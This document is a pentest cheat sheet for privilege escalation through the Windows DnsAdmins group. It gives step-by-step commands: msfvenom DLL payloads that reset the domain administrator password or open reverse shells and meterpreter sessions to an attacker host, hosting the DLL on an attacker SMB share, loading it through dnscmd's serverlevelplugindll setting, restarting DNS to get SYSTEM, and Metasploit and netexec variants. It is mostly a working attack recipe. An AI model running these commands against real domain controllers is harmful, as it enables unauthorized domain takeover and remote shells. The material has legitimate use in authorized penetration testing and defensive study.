### A user that is a member of the DnsAdmins group, has the ability to use dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service.

### We can create our own malicious .dll payload with msfvenom to escalate privileges

### Steps:

## Enumeration

    Get-NetGroupMember -GroupName "DNSAdmins"

    Get-ADGroupMember -Identity DNSAdmins

## Exploitation

#### 1) Craft malicious dll file

    msfvenom -p windows/x64/exec cmd='net user administrator P@55w0rd123! /domain' -f dll > pwn.dll

#### 2) Host the file remotely

    sudo smbserver.py share ./ 

#### 3) Set the remote DLL path into the windows registry

    cmd /c dnscmd localhost /config /serverlevelplugindll \\OUR_IP\share\pwn.dll 

#### 4) Restart the DNS service to execute our malicious dll

    sc.exe stop dns

#### 5) 

    sc.exe start dns 

#### 6) 

    sudo psexec.py DOMAIN.LOCAL/administrator@DC_IP

#### 7) PWN3D!

## Alternate Method: DNSServer module

    $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All

    $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"

    Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose

### Check for successful previous command

    Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

## OR

### 1) Create reverse shell payload

    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=80 -f dll > exploit.dll

### 2) Once the malicious DLL has been uploaded to the target the following command can be used to register the DLL.

    dnscmd.exe <DCName> /config /serverlevelplugindll <PathToDLL>
    dnscmd.exe dc01 /config /serverlevelplugindll C:\Users\Moe\Documents\exploit.dll

### 3) Setu a listener on attacker machine

    sudo nc -lvp 80

### 4) From here stopping the DNS service and starting it again will spawn a SYSTEM shell to the netcat listener.

    sc.exe stop dns
    sc.exe start DNS

## Alternate Method: Metasploit

    use exploit/windows/local/dnsadmin_serverlevelplugindll

## Alternate Method: Netexec and python

#### Generate the DLL

    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=1234 -f dll > rev.dll

#### On the DNS machine, modify the server conf

    nxc smb <target> -u user1 -p password -X "dnscmd.exe /config /serverlevelplugindll \\<share_SMB>\rev.dll"

#### Restart DNS

    services.py 'domain.local'/'user1':'password'@<DNS_server> stop dns
    services.py 'domain.local'/'user1':'password'@<DNS_server> start dns
